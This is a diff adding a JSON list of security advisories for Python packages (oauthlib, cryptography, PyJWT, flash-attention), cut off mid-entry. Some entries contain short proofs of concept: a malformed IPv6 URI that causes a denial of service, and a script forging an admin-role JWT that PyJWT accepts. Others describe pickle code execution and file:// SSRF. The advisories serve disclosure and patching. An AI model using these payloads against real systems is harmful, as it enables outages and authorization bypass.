@@ -1,0 +1,4415 @@
+[
+  {
+    "id": "GHSA-3pgj-pg6c-r5p7",
+    "summary": "OAuthLib vulnerable to DoS when attacker provides malicious IPV6 URI",
+    "details": "### Impact\n- Attacker providing malicious redirect uri can cause DoS to oauthlib's web application.\n- Attacker can also leverage usage of `uri_validate` functions depending where it is used.\n\n_What kind of vulnerability is it? Who is impacted?_\n\nOauthlib applications using OAuth2.0 provider support or use directly `uri_validate` function.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nIssue fixed in 3.2.2 release.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nThe `redirect_uri` can be verified in web toolkit (i.e `bottle-oauthlib`, `django-oauth-toolkit`, ...) before oauthlib is called. A sample check if `:` is present to reject the request can prevent the DoS, assuming no port or IPv6 is fundamentally required.\n\n### References\nAttack Vector:\n- Attacker providing malicious redirect uri:\nhttps://github.com/oauthlib/oauthlib/blob/d4bafd9f1d0eba3766e933b1ac598cbbf37b8914/oauthlib/oauth2/rfc6749/grant_types/base.py#L232\n- Vulnerable `uri_validate` functions:\nhttps://github.com/oauthlib/oauthlib/blob/2b8a44855a51ad5a5b0c348a08c2564a2e197ea2/oauthlib/uri_validate.py\n\n### PoC\n```python\nis_absolute_uri(\"http://[:::::::::::::::::::::::::::::::::::::::]/path\")\n```\n\n### Acknowledgement\nSpecial thanks to Sebastian Chnelik - PyUp.io",
+    "aliases": [
+      "CVE-2022-36087",
+      "PYSEC-2022-269"
+    ],
+    "modified": "2024-10-07T17:04:39.169086Z",
+    "published": "2022-09-16T21:02:52Z",
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-20",
+        "CWE-601"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true,
+      "github_reviewed_at": "2022-09-16T21:02:52Z",
+      "nvd_published_at": "2022-09-09T21:15:00Z"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/oauthlib/oauthlib/security/advisories/GHSA-3pgj-pg6c-r5p7"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36087"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/oauthlib/oauthlib/commit/2e40b412c844ecc4673c3fa3f72181f228bdbacd"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/oauthlib/oauthlib"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/oauthlib/oauthlib/blob/2b8a44855a51ad5a5b0c348a08c2564a2e197ea2/oauthlib/uri_validate.py"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/oauthlib/oauthlib/blob/d4bafd9f1d0eba3766e933b1ac598cbbf37b8914/oauthlib/oauth2/rfc6749/grant_types/base.py#L232"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/oauthlib/oauthlib/releases/tag/v3.2.1"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/oauthlib/PYSEC-2022-269.yaml"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LXOPIA6M57CFQPUT6HHSNXCTV6QA3UDI"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NBCQJR3ZF7FVNTJYRVPVSQEQRAYZIUHU"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QRYLYHE5HWF6R2CRLJFUK4PILR47WXOE"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/X2CQZM5CKOUM4GW2GTAPQEQFPITQ6F7S"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "oauthlib",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/oauthlib"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "3.1.1"
+              },
+              {
+                "fixed": "3.2.2"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "3.1.1",
+          "3.2.0",
+          "3.2.1"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-3pgj-pg6c-r5p7/GHSA-3pgj-pg6c-r5p7.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H"
+      },
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-3ww4-gg4f-jr7f",
+    "summary": "Python Cryptography package vulnerable to Bleichenbacher timing oracle attack",
+    "details": "A flaw was found in the python-cryptography package. This issue may allow a remote attacker to decrypt captured messages in TLS servers that use RSA key exchanges, which may lead to exposure of confidential or sensitive data.",
+    "aliases": [
+      "CVE-2023-50782",
+      "PYSEC-2026-1283"
+    ],
+    "modified": "2026-09-10T03:50:05.279171645Z",
+    "published": "2024-02-05T21:30:31Z",
+    "database_specific": {
+      "github_reviewed": true,
+      "github_reviewed_at": "2024-02-05T23:04:50Z",
+      "nvd_published_at": "2024-02-05T21:15:11Z",
+      "cwe_ids": [
+        "CWE-203",
+        "CWE-208",
+        "CWE-385"
+      ],
+      "severity": "HIGH"
+    },
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-50782"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/issues/9785"
+      },
+      {
+        "type": "WEB",
+        "url": "https://access.redhat.com/security/cve/CVE-2023-50782"
+      },
+      {
+        "type": "WEB",
+        "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2254432"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pyca/cryptography"
+      },
+      {
+        "type": "WEB",
+        "url": "https://www.couchbase.com/alerts"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "42.0.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.1",
+          "0.2",
+          "0.2.1",
+          "0.2.2",
+          "0.3",
+          "0.4",
+          "0.5",
+          "0.5.1",
+          "0.5.2",
+          "0.5.3",
+          "0.5.4",
+          "0.6",
+          "0.6.1",
+          "0.7",
+          "0.7.1",
+          "0.7.2",
+          "0.8",
+          "0.8.1",
+          "0.8.2",
+          "0.9",
+          "0.9.1",
+          "0.9.2",
+          "0.9.3",
+          "1.0",
+          "1.0.1",
+          "1.0.2",
+          "1.1",
+          "1.1.1",
+          "1.1.2",
+          "1.2",
+          "1.2.1",
+          "1.2.2",
+          "1.2.3",
+          "1.3",
+          "1.3.1",
+          "1.3.2",
+          "1.3.3",
+          "1.3.4",
+          "1.4",
+          "1.5",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6",
+          "1.7",
+          "1.7.1",
+          "1.7.2",
+          "1.8",
+          "1.8.1",
+          "1.8.2",
+          "1.9",
+          "2.0",
+          "2.0.1",
+          "2.0.2",
+          "2.0.3",
+          "2.1",
+          "2.1.1",
+          "2.1.2",
+          "2.1.3",
+          "2.1.4",
+          "2.2",
+          "2.2.1",
+          "2.2.2",
+          "2.3",
+          "2.3.1",
+          "2.4",
+          "2.4.1",
+          "2.4.2",
+          "2.5",
+          "2.6",
+          "2.6.1",
+          "2.7",
+          "2.8",
+          "2.9",
+          "2.9.1",
+          "2.9.2",
+          "3.0",
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0",
+          "39.0.1",
+          "39.0.2",
+          "40.0.0",
+          "40.0.1",
+          "40.0.2",
+          "41.0.0",
+          "41.0.1",
+          "41.0.2",
+          "41.0.3",
+          "41.0.4",
+          "41.0.5",
+          "41.0.6",
+          "41.0.7"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/02/GHSA-3ww4-gg4f-jr7f/GHSA-3ww4-gg4f-jr7f.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-537c-gmf6-5ccf",
+    "summary": "Vulnerable OpenSSL included in cryptography wheels",
+    "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in wheels prior to cryptograph 48.01 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20260609.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
+    "modified": "2026-09-10T03:50:48.298936410Z",
+    "published": "2026-06-15T20:12:27Z",
+    "database_specific": {
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-15T20:12:27Z",
+      "nvd_published_at": null,
+      "cwe_ids": [
+        "CWE-125",
+        "CWE-1395"
+      ],
+      "severity": "HIGH"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-537c-gmf6-5ccf"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pyca/cryptography"
+      },
+      {
+        "type": "WEB",
+        "url": "https://openssl-library.org/news/secadv/20260609.txt"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0.5.0"
+              },
+              {
+                "fixed": "48.0.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.5",
+          "0.5.1",
+          "0.5.2",
+          "0.5.3",
+          "0.5.4",
+          "0.6",
+          "0.6.1",
+          "0.7",
+          "0.7.1",
+          "0.7.2",
+          "0.8",
+          "0.8.1",
+          "0.8.2",
+          "0.9",
+          "0.9.1",
+          "0.9.2",
+          "0.9.3",
+          "1.0",
+          "1.0.1",
+          "1.0.2",
+          "1.1",
+          "1.1.1",
+          "1.1.2",
+          "1.2",
+          "1.2.1",
+          "1.2.2",
+          "1.2.3",
+          "1.3",
+          "1.3.1",
+          "1.3.2",
+          "1.3.3",
+          "1.3.4",
+          "1.4",
+          "1.5",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6",
+          "1.7",
+          "1.7.1",
+          "1.7.2",
+          "1.8",
+          "1.8.1",
+          "1.8.2",
+          "1.9",
+          "2.0",
+          "2.0.1",
+          "2.0.2",
+          "2.0.3",
+          "2.1",
+          "2.1.1",
+          "2.1.2",
+          "2.1.3",
+          "2.1.4",
+          "2.2",
+          "2.2.1",
+          "2.2.2",
+          "2.3",
+          "2.3.1",
+          "2.4",
+          "2.4.1",
+          "2.4.2",
+          "2.5",
+          "2.6",
+          "2.6.1",
+          "2.7",
+          "2.8",
+          "2.9",
+          "2.9.1",
+          "2.9.2",
+          "3.0",
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0",
+          "39.0.1",
+          "39.0.2",
+          "40.0.0",
+          "40.0.1",
+          "40.0.2",
+          "41.0.0",
+          "41.0.1",
+          "41.0.2",
+          "41.0.3",
+          "41.0.4",
+          "41.0.5",
+          "41.0.6",
+          "41.0.7",
+          "42.0.0",
+          "42.0.1",
+          "42.0.2",
+          "42.0.3",
+          "42.0.4",
+          "42.0.5",
+          "42.0.6",
+          "42.0.7",
+          "42.0.8",
+          "43.0.0",
+          "43.0.1",
+          "43.0.3",
+          "44.0.0",
+          "44.0.1",
+          "44.0.2",
+          "44.0.3",
+          "45.0.0",
+          "45.0.1",
+          "45.0.2",
+          "45.0.3",
+          "45.0.4",
+          "45.0.5",
+          "45.0.6",
+          "45.0.7",
+          "46.0.0",
+          "46.0.1",
+          "46.0.2",
+          "46.0.3",
+          "46.0.4",
+          "46.0.5",
+          "46.0.6",
+          "46.0.7",
+          "47.0.0",
+          "48.0.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-537c-gmf6-5ccf/GHSA-537c-gmf6-5ccf.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-5cpq-8wj7-hf2v",
+    "summary": "Vulnerable OpenSSL included in cryptography wheels",
+    "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
+    "modified": "2026-09-10T03:50:02.133725445Z",
+    "published": "2023-06-02T17:13:10Z",
+    "database_specific": {
+      "severity": "LOW",
+      "github_reviewed": true,
+      "github_reviewed_at": "2023-06-02T17:13:10Z",
+      "nvd_published_at": null,
+      "cwe_ids": []
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-5cpq-8wj7-hf2v"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/commit/8708245ccdeaff21d65eea68a4f8d2a7c5949a22"
+      },
+      {
+        "type": "WEB",
+        "url": "https://cryptography.io/en/latest/changelog/#v41-0-0"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pyca/cryptography"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0.5"
+              },
+              {
+                "fixed": "41.0.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.5",
+          "0.5.1",
+          "0.5.2",
+          "0.5.3",
+          "0.5.4",
+          "0.6",
+          "0.6.1",
+          "0.7",
+          "0.7.1",
+          "0.7.2",
+          "0.8",
+          "0.8.1",
+          "0.8.2",
+          "0.9",
+          "0.9.1",
+          "0.9.2",
+          "0.9.3",
+          "1.0",
+          "1.0.1",
+          "1.0.2",
+          "1.1",
+          "1.1.1",
+          "1.1.2",
+          "1.2",
+          "1.2.1",
+          "1.2.2",
+          "1.2.3",
+          "1.3",
+          "1.3.1",
+          "1.3.2",
+          "1.3.3",
+          "1.3.4",
+          "1.4",
+          "1.5",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6",
+          "1.7",
+          "1.7.1",
+          "1.7.2",
+          "1.8",
+          "1.8.1",
+          "1.8.2",
+          "1.9",
+          "2.0",
+          "2.0.1",
+          "2.0.2",
+          "2.0.3",
+          "2.1",
+          "2.1.1",
+          "2.1.2",
+          "2.1.3",
+          "2.1.4",
+          "2.2",
+          "2.2.1",
+          "2.2.2",
+          "2.3",
+          "2.3.1",
+          "2.4",
+          "2.4.1",
+          "2.4.2",
+          "2.5",
+          "2.6",
+          "2.6.1",
+          "2.7",
+          "2.8",
+          "2.9",
+          "2.9.1",
+          "2.9.2",
+          "3.0",
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0",
+          "39.0.1",
+          "39.0.2",
+          "40.0.0",
+          "40.0.1",
+          "40.0.2"
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 40.0.2",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/06/GHSA-5cpq-8wj7-hf2v/GHSA-5cpq-8wj7-hf2v.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0"
+  },
+  {
+    "id": "GHSA-752w-5fwx-jx9f",
+    "summary": "PyJWT accepts unknown `crit` header extensions",
+    "details": "## Summary\n\nPyJWT does not validate the `crit` (Critical) Header Parameter defined in\nRFC 7515 \u00a74.1.11. When a JWS token contains a `crit` array listing\nextensions that PyJWT does not understand, the library accepts the token\ninstead of rejecting it. This violates the **MUST** requirement in the RFC.\n\nThis is the same class of vulnerability as CVE-2025-59420 (Authlib),\nwhich received CVSS 7.5 (HIGH).\n\n---\n\n## RFC Requirement\n\nRFC 7515 \u00a74.1.11:\n\n> The \"crit\" (Critical) Header Parameter indicates that extensions to this\n> specification and/or [JWA] are being used that **MUST** be understood and\n> processed. [...] If any of the listed extension Header Parameters are\n> **not understood and supported** by the recipient, then the **JWS is invalid**.\n\n---\n\n## Proof of Concept\n\n```python\nimport jwt  # PyJWT 2.8.0\nimport hmac, hashlib, base64, json\n\n# Construct token with unknown critical extension\nheader = {\"alg\": \"HS256\", \"crit\": [\"x-custom-policy\"], \"x-custom-policy\": \"require-mfa\"}\npayload = {\"sub\": \"attacker\", \"role\": \"admin\"}\n\ndef b64url(data):\n    return base64.urlsafe_b64encode(data).rstrip(b\"=\").decode()\n\nh = b64url(json.dumps(header, separators=(\",\", \":\")).encode())\np = b64url(json.dumps(payload, separators=(\",\", \":\")).encode())\nsig = b64url(hmac.new(b\"secret\", f\"{h}.{p}\".encode(), hashlib.sha256).digest())\ntoken = f\"{h}.{p}.{sig}\"\n\n# Should REJECT \u2014 x-custom-policy is not understood by PyJWT\ntry:\n    result = jwt.decode(token, \"secret\", algorithms=[\"HS256\"])\n    print(f\"ACCEPTED: {result}\")\n    # Output: ACCEPTED: {'sub': 'attacker', 'role': 'admin'}\nexcept Exception as e:\n    print(f\"REJECTED: {e}\")\n```\n\n**Expected:** `jwt.exceptions.InvalidTokenError: Unsupported critical extension: x-custom-policy`\n**Actual:** Token accepted, payload returned.\n\n### Comparison with RFC-compliant library\n\n```python\n# jwcrypto \u2014 correctly rejects\nfrom jwcrypto import jwt as jw_jwt, jwk\nkey = jwk.JWK(kty=\"oct\", k=b64url(b\"secret\"))\njw_jwt.JWT(jwt=token, key=key, algs=[\"HS256\"])\n# raises: InvalidJWSObject('Unknown critical header: \"x-custom-policy\"')\n```\n\n---\n\n## Impact\n\n- **Split-brain verification** in mixed-library deployments (e.g., API\n  gateway using jwcrypto rejects, backend using PyJWT accepts)\n- **Security policy bypass** when `crit` carries enforcement semantics\n  (MFA, token binding, scope restrictions)\n- **Token binding bypass** \u2014 RFC 7800 `cnf` (Proof-of-Possession) can be\n  silently ignored\n- See CVE-2025-59420 for full impact analysis\n\n---\n\n## Suggested Fix\n\nIn `jwt/api_jwt.py`, add validation in `_validate_headers()` or\n`decode()`:\n\n```python\n_SUPPORTED_CRIT = {\"b64\"}  # Add extensions PyJWT actually supports\n\ndef _validate_crit(self, headers: dict) -> None:\n    crit = headers.get(\"crit\")\n    if crit is None:\n        return\n    if not isinstance(crit, list) or len(crit) == 0:\n        raise InvalidTokenError(\"crit must be a non-empty array\")\n    for ext in crit:\n        if ext not in self._SUPPORTED_CRIT:\n            raise InvalidTokenError(f\"Unsupported critical extension: {ext}\")\n        if ext not in headers:\n            raise InvalidTokenError(f\"Critical extension {ext} not in header\")\n```\n\n---\n\n## CWE\n\n- CWE-345: Insufficient Verification of Data Authenticity\n- CWE-863: Incorrect Authorization\n\n## References\n\n- [RFC 7515 \u00a74.1.11](https://www.rfc-editor.org/rfc/rfc7515.html#section-4.1.11)\n- [CVE-2025-59420 \u2014 Authlib crit bypass (CVSS 7.5)](https://osv.dev/vulnerability/GHSA-9ggr-2464-2j32)\n- [RFC 7800 \u2014 Proof-of-Possession Key Semantics](https://www.rfc-editor.org/rfc/rfc7800)",
+    "aliases": [
+      "CVE-2026-32597",
+      "PYSEC-2026-120"
+    ],
+    "modified": "2026-09-10T03:50:59.993704484Z",
+    "published": "2026-03-13T20:05:04Z",
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-345",
+        "CWE-863"
+      ],
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-03-13T20:05:04Z",
+      "nvd_published_at": "2026-03-13T19:55:09Z"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-752w-5fwx-jx9f"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-32597"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/jpadilla/pyjwt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-120.yaml"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.debian.org/debian-lts-announce/2026/05/msg00008.html"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "pyjwt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/pyjwt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "2.12.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.1.1",
+          "0.1.2",
+          "0.1.3",
+          "0.1.4",
+          "0.1.5",
+          "0.1.6",
+          "0.1.7",
+          "0.1.8",
+          "0.1.9",
+          "0.2.0",
+          "0.2.1",
+          "0.2.3",
+          "0.3.0",
+          "0.3.1",
+          "0.3.2",
+          "0.4.0",
+          "0.4.1",
+          "0.4.2",
+          "0.4.3",
+          "1.0.0",
+          "1.0.1",
+          "1.1.0",
+          "1.3.0",
+          "1.4.0",
+          "1.4.1",
+          "1.4.2",
+          "1.5.0",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6.0",
+          "1.6.1",
+          "1.6.3",
+          "1.6.4",
+          "1.7.0",
+          "1.7.1",
+          "2.0.0",
+          "2.0.0a1",
+          "2.0.0a2",
+          "2.0.1",
+          "2.1.0",
+          "2.10.0",
+          "2.10.1",
+          "2.11.0",
+          "2.2.0",
+          "2.3.0",
+          "2.4.0",
+          "2.5.0",
+          "2.6.0",
+          "2.7.0",
+          "2.8.0",
+          "2.9.0"
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 2.11.0",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-752w-5fwx-jx9f/GHSA-752w-5fwx-jx9f.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-7g5w-pq96-8c5w",
+    "summary": "flash-attention contains an insecure deserialization vulnerability in its checkpoint loading mechanism",
+    "details": "The flash-attention training framework thru commit e724e2588cbe754beb97cf7c011b5e7e34119e62 (2025-13-04) contains an insecure deserialization vulnerability (CWE-502) in its checkpoint loading mechanism. The load_checkpoint() function in checkpoint.py and the checkpoint loading code in eval.py use torch.load() without enabling the security-restrictive weights_only=True parameter. This allows the deserialization of arbitrary Python objects via the pickle module. An attacker can exploit this by providing a maliciously crafted checkpoint file. When a victim loads this checkpoint during model warmstarting or evaluation, arbitrary code is executed on the victim's system.",
+    "aliases": [
+      "CVE-2026-31253",
+      "PYSEC-2026-2477"
+    ],
+    "modified": "2026-07-14T05:30:20.366472231Z",
+    "published": "2026-05-11T18:31:44Z",
+    "database_specific": {
+      "nvd_published_at": "2026-05-11T17:16:20Z",
+      "cwe_ids": [
+        "CWE-502",
+        "CWE-94"
+      ],
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-05-18T15:22:20Z"
+    },
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-31253"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/Dao-AILab/flash-attention"
+      },
+      {
+        "type": "WEB",
+        "url": "https://www.notion.so/CVE-2026-31253-35d1e1393188813f9e77e2038104bc49"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "flash-attn",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/flash-attn"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "last_affected": "2.8.3"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.2.0",
+          "0.2.1",
+          "0.2.2",
+          "0.2.3",
+          "0.2.4",
+          "0.2.5",
+          "0.2.6.post1",
+          "0.2.7",
+          "0.2.8",
+          "1.0.0",
+          "1.0.1",
+          "1.0.2",
+          "1.0.3",
+          "1.0.3.post0",
+          "1.0.4",
+          "1.0.5",
+          "1.0.6",
+          "1.0.7",
+          "1.0.8",
+          "1.0.9",
+          "2.0.0.post1",
+          "2.0.1",
+          "2.0.2",
+          "2.0.3",
+          "2.0.4",
+          "2.0.5",
+          "2.0.6",
+          "2.0.6.post2",
+          "2.0.7",
+          "2.0.8",
+          "2.0.9",
+          "2.1.0",
+          "2.1.1",
+          "2.1.2.post3",
+          "2.2.0",
+          "2.2.1",
+          "2.2.2",
+          "2.2.3.post2",
+          "2.2.4",
+          "2.2.4.post1",
+          "2.2.5",
+          "2.3.0",
+          "2.3.1.post1",
+          "2.3.2",
+          "2.3.3",
+          "2.3.4",
+          "2.3.5",
+          "2.3.6",
+          "2.4.0.post1",
+          "2.4.1",
+          "2.4.2",
+          "2.4.3.post1",
+          "2.5.0",
+          "2.5.1.post1",
+          "2.5.2",
+          "2.5.3",
+          "2.5.4",
+          "2.5.5",
+          "2.5.6",
+          "2.5.7",
+          "2.5.8",
+          "2.5.9.post1",
+          "2.6.0.post1",
+          "2.6.1",
+          "2.6.2",
+          "2.6.3",
+          "2.7.0.post2",
+          "2.7.1.post4",
+          "2.7.2.post1",
+          "2.7.3",
+          "2.7.4.post1",
+          "2.8.0.post2",
+          "2.8.1",
+          "2.8.2",
+          "2.8.3"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-7g5w-pq96-8c5w/GHSA-7g5w-pq96-8c5w.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-993g-76c3-p5m4",
+    "summary": "PyJWKClient: missing scheme allowlist enables CVE-2024-21643-class SSRF + token forgery via file://, ftp://, data: schemes",
+    "details": "> [!NOTE]\n> The library does not directly return non-HTTP(S) URI contents to the attacker; the chained \"plant a JWKS to forge tokens\" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. Severity is scored for the scheme-acceptance bug in isolation.\n\n## Summary\n\nPyJWKClient passes its `uri` argument directly to `urllib.request.urlopen()` which uses Python stdlib's default `OpenerDirector` registering `HTTPHandler`, `HTTPSHandler`, `FTPHandler`, **`FileHandler`**, and `DataHandler`. There is currently no documented option to restrict which schemes PyJWKClient will fetch.\n\nIf an application's `jku` URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can:\n\n1. Cause PyJWKClient to read arbitrary local files via `file://` (SSRF on local filesystem) \u2014 the file's contents are passed to 